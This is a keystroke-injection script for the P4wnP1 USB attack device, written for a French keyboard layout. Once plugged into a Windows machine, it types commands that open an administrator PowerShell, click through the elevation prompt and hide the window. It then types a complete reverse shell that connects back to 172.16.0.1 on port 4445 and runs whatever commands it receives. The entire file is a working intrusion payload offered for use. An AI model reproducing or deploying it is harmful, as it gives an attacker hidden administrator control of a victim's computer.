// Reverse Shell FRv2 by INFINITION -> Lancer netcat -lvp 4445 sur P4wnP1
hide=true;
function hidePS() {
	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
  	press("ENTER");
}
layout('fr');			// FR keyboard layout
typingSpeed(0,0)        // FAST typingSpeed
press("GUI r")			// Run Command
delay(200)				// wait a little
type("powershell")			// call command
press("CTRL SHIFT ENTER")	// run as administrator
delay(1000)				// wait a little
if (hide) { hidePS(); }
press("SHIFT TAB")		// select Yes 
press("ENTER")			// validate
delay(3000)				// Booom in admin, now start typing reverseshell code
type("$client = New-Object System.Net.Sockets.TCPClient(")
layout('us')			// trick to avoid bug if FR layout in
press("3")				// current version of P4wnP1
layout('fr')			// to get " char
type("172.16.0.1")      // ip of server (usb lan of P4wnP1)
layout('us')
press("3")
layout('fr')
type(",4445)\n")        // listening port of server
type("$stream = $client.GetStream();[byte[]]$bytes = 0..65535")
layout('us')
press("RIGHT_ALT 6")
layout('fr')
type("%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 ")
layout('us')
press("RIGHT_ALT 6")
layout('fr')
type(" Out-String );$sendback2 = $sendback + ")
layout('us')
press("3")
layout('fr')
type("PS ")
layout('us')
press("3")
layout('fr')
type(" + (pwd).Path + ")
layout('us')
press("3")
layout('fr')
type("> ")
layout('us')
press("3")
layout('fr')
type(";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();exit\n")
// end of shellcode injection
press("GUI DOWN") 	// minimize windows in system tray
